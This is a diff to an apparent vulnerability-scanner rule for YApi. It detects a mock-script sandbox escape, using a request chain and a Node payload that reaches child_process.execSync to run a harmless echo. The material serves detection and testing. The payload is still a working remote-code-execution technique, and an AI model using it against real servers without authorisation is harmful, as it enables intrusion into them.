@@ -15,18 +15,16 @@ rules:
       Content-Type: application/json;charset=UTF-8
     follow_redirects: true
     body: |
-      {"email":"{{redemail}}@qq.com","password":"2{{redpassword}}3","username":"{{redemail}}"}
+      {"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
     expression: |
-      response.status == 200 && response.headers["Set-Cookie"].contains("_yapi_token") && response.body.bcontains(bytes(redemail))
+      response.status == 200 && response.headers["Set-Cookie"].contains("_yapi_token=") && response.headers["Set-Cookie"].contains("_yapi_uid=") && response.body.bcontains(bytes(redemail))
 
   - method: GET
     path: /api/group/list
-    headers:
-      Content-Type: application/json, text/plain, */*
     search: |
       "_id":(?P<group_id>.+?),
     expression: |
-      response.status == 200 && response.body.bcontains(bytes("custom_field1"))
+      response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(bytes("custom_field1"))
 
   - method: POST
     path: /api/project/add
@@ -44,7 +42,7 @@ rules:
     search: |
       "_id":(?P<catid>.+?),
     expression: |
-      response.status == 200
+      response.status == 200 && response.body.bcontains(bytes("成功！"))
 
   - method: POST
     path: /api/interface/add
@@ -64,7 +62,7 @@ rules:
     body: |
       {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo {{r1}}${{{r2}}}{{r3}}^{{r4}}\").toString()","enable":true}
     expression: |
-      response.status == 200 && response.body.bcontains(bytes("mock_script"))
+      response.status == 200 && response.body.bcontains(bytes("成功！"))
 
   - method: GET
     path: /mock/{{project_id}}/{{redinterface}}
